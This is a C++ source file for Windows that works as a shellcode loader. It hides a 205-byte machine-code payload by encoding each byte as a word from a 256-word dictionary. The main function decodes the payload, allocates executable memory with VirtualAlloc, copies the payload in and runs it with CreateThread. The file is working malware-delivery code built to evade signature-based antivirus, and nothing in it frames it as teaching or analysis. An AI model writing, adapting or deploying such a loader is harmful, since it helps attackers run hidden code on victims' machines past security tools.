#include <windows.h>
#include <cstdio>
#include <iostream>
#include <string>
#include <map>
#include <vector>
#include <sstream>
#include <iomanip>
#include <cstdlib>
#include <bitset>

using namespace std;

vector<int> decrypt(string key[], string encrypted[], int lenEncrypted)
{
    map<string, int> dict;
    vector<int> decrypted;

    for (int i = 0; i < 256 ; i++)
    {
        dict[key[i]] = i;
    }

    for (int i = 0; i < lenEncrypted; i++)
    {
        decrypted.push_back(dict[encrypted[i]]);
        //cout << dict[encrypted[i]] << " ";
    }

    return decrypted;
}

int main()
{
    string key[256] = {"mullah","stopgaps","teenaged","tanling","farewelled","demiorbit","scalae","piceotestaceous","elapoid","tasking","undespised","philanderers","tagrag","hagfish","phew","gair","xanthopia","pectins","coveralled","uredospore","naivite","akeki","malodor","unpenetrably","displayer","vivific","adighe","dermatocoptic","catalpas","recruity","assorters","nonutilization","pya","mistrist","posttympanic","pretrematic","reagins","empiriological","fibster","toothdrawer","nongerminal","epees","gullyhole","wretchlessly","redeliver","gulfing","despot","frontenis","janitors","plugugly","uncapped","caprifolium","sphygmometric","scabrously","hubbob","parsondom","cimeliarch","exotery","pcf","spindlewise","accoast","viva","shogging","plasmocytoma","revery","hypochaeris","rechabite","unpatience","squirting","acquereur","citternhead","orotherapy","crannock","hyphenating","pillowslip","chapacura","microsoftware","sinatra","preinsinuated","melanagogue","pewy","cheesiness","refers","pinnatisect","influxable","unposted","nosily","frictionable","nagster","indorsor","endosporous","speedboatman","termed","squeakiest","necessist","isochimes","forcarve","reshun","semiglutin","wallet","censive","pyrenocarpic","chimar","insectariums","indigogen","noncalculably","pilusli","permutatorial","pectocellulose","poeticness","sapient","aquocarbonic","woodward","disability","chemosorption","vintnership","analyses","domesdays","equableness","optimates","salinometer","aholt","tauri","resolves","taistrel","womanproof","autoeciousness","bowlike","basaltes","overscatter","prebridal","rgisseur","denticular","unimaginableness","equatorward","revelly","retinular","whaleback","creaturize","costaea","blowsier","gelignite","precatory","equisetums","convoluted","picklelike","sosquil","bridled","cycloolefinic","guayroto","helver","perissodactylic","hetaerolite","angulinerved","athens","nanoid","coseat","chinaphthol","macrandre","cicalas","cledonism","calentural","nonfundable","subdirector","cytogamy","trumeau","dispeopled","tritopine","incorrigibly","minikinly","schizospore","nama","scyphulus","psoriasic","chondrofetal","gnaw","unillumination","unmanacle","demarked","ginnle","chaco","gynecratic","princelike","smich","withnay","superpiously","monticulous","contemplatively","suctional","zippeite","chalcophyllite","farmhands","carpogonium","middlebrows","overjudging","continuator","translay","jervine","fidleys","feticidal","incolumity","fabraea","unclutched","attitudinizer","fbi","chromidiogamy","agedness","unveraciously","armorican","wahahe","touchbox","almadia","coenenchymata","ingine","droil","roentgentherapy","chastize","sprinkleproof","semihistorical","pigpen","illustratory","leavens","earwigginess","pseudonitrol","equimolecular","uniseptate","nonremovable","retrocouple","wavery","deipnodiplomatic","unentangling","paragoned","vagally","biznagas","fichu","pseudosuchian","pivoting","dedo","dacrydium","delimiter","fibrinoplastic","metas","tosaphoth","reshorten","physicophilosophy","transgresses","thermotropic","dimorphotheca","sciographic","combwise","brachystochrone","beamster","hurrer","gewgawed","squattish","tamanowus",};

    string encrypted[205] = {"crannock","plugugly","tamanowus","crannock","dimorphotheca","paragoned","pyrenocarpic","crannock","costaea","nagster","forcarve","crannock","costaea","speedboatman","displayer","crannock","costaea","speedboatman","pya","crannock","costaea","dermatocoptic","crannock","costaea","dermatocoptic","crannock","costaea","speedboatman","pya","hyphenating","whaleback","chastize","costaea","speedboatman","accoast","microsoftware","stopgaps","continuator","crannock","plugugly","fabraea","chimar","overscatter","middlebrows","tamanowus","retinular","crannock","middlebrows","biznagas","elapoid","costaea","naivite","philanderers","microsoftware","stopgaps","overjudging","sinatra","plugugly","touchbox","squirting","costaea","refers","catalpas","sinatra","stopgaps","overjudging","sinatra","plugugly","pigpen","squirting","costaea","endosporous","pya","sinatra","stopgaps","continuator","sinatra","plugugly","wavery","squirting","costaea","semiglutin","reagins","sinatra","stopgaps","translay","pseudosuchian","uncapped","speedboatman","indorsor","crannock","plugugly","carpogonium","crannock","whaleback","nonremovable","cheesiness","crannock","costaea","tagrag","reagins","crannock","plugugly","tamanowus","hypochaeris","costaea","accoast","rgisseur","microsoftware","stopgaps","feticidal","crannock","whaleback","droil","reshorten","dispeopled","analyses","demiorbit","crannock","tamanowus","carpogonium","pseudosuchian","unentangling","indorsor","chimar","hypochaeris","costaea","farewelled","squirting","hypochaeris","costaea","farewelled","prebridal","microsoftware","stopgaps","carpogonium","pinnatisect","continuator","crannock","plugugly","fabraea","basaltes","middlebrows","piceotestaceous","crannock","withnay","gair","incorrigibly","helver","picklelike","monticulous","revelly","athens","coseat","crannock","dimorphotheca","armorican","crannock","middlebrows","vagally","elapoid","pewy","cheesiness","vagally","unillumination","tamanowus","tamanowus","tamanowus","hyphenating","whaleback","fidleys","crannock","plugugly","fabraea","crannock","dimorphotheca","uniseptate","pewy","crannock","withnay","coseat","macrandre","bridled","coseat","wahahe","athens","revelly","athens","crannock","dimorphotheca","armorican","pewy","crannock","whaleback","uniseptate","crannock","tamanowus","overjudging","crannock","rgisseur","pivoting","pya","hypochaeris","tamanowus","droil",};

    int lenEncrypted = sizeof(encrypted)/sizeof(string);

    vector<int> decrypted;
    unsigned char shellcode[lenEncrypted];
    decrypted = decrypt(key, encrypted, lenEncrypted);


    std::stringstream ss;
    string result;
    for (int i = 0; i < lenEncrypted; i++)
    {
        //ss << "\\x" <<std::setfill('0') << std::setw(2) << std::hex << decrypted[i];
        ss <<std::setfill('0') << std::setw(2) << std::hex << decrypted[i] << " ";

    }
    result = ss.str();
    cout << result << "\n";

    std::string hex_chars(result);

    std::istringstream hex_chars_stream(hex_chars);
    std::vector<unsigned char> shellcode3;

    unsigned int ch;
    while (hex_chars_stream >> std::hex >> ch)
    {
        shellcode3.push_back(ch);
    }

    int j = 0;
    for (auto i = shellcode3.begin(); i != shellcode3.end(); ++i){
        shellcode[j] = *i;
        //cout << *i << " ";
        j++;
    }


    for (int i = 0; i < lenEncrypted; i++){
        cout << shellcode[i];
    }



	// Step 1 : Allocate the memory
	void* memory = VirtualAlloc(nullptr,
								sizeof(shellcode),
								MEM_COMMIT,
								PAGE_EXECUTE_READWRITE);

	if (memory == nullptr)
	{
		return 1;
	}

#if DEBUG
	printf("Allocated memory at %p\n", memory);
	printf("Hit enter to continue\n");
	getchar();
#endif

	// Step 2 : Copy the shellcode to the allocated memory
	memcpy(memory,
		   shellcode,
		   sizeof(shellcode));

#if DEBUG
	printf("Shellcode copied to memory\n");
	printf("Hit enter to continue\n");
	getchar();
#endif

	// Step 3 : Create a thread pointing to the shellcode address
	HANDLE thread =	CreateThread(nullptr,
				 0,
				 (LPTHREAD_START_ROUTINE) memory,
				 nullptr,
				 0,
				 nullptr);

	if (thread == nullptr)
	{
		return 1;
	}

	// Wait for the thread to finish
	WaitForSingleObject(thread, INFINITE);

	return 0;
}
